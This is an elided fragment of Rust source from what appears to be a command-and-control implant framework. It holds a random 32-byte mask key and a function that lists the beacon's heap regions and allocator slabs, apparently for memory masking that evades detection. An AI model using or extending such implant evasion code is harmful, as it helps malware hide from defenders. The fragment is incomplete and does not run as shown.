...
static MASK_KEY_BUF: nyx_implant_core::cell::SyncCell<[u8; 32]> =
    nyx_implant_core::cell::SyncCell::new([0u8; 32]);
...
pub(crate) fn mask_key() -> &'static [u8; 32] {
    ...
    let mut key = [0u8; 32];
    if !nyx_implant_core::diag::csprng_fill(&mut key) {
...
pub fn enumerate_beacon_heap_regions() -> alloc::vec::Vec<(*mut u8, usize)> {
    let mut result =
        alloc::vec::Vec::with_capacity(MAX_REGIONS + nyx_implant_core::ntalloc::MAX_SLABS);
    ...
    for (base, len) in nyx_implant_core::ntalloc::enumerate_slabs() {
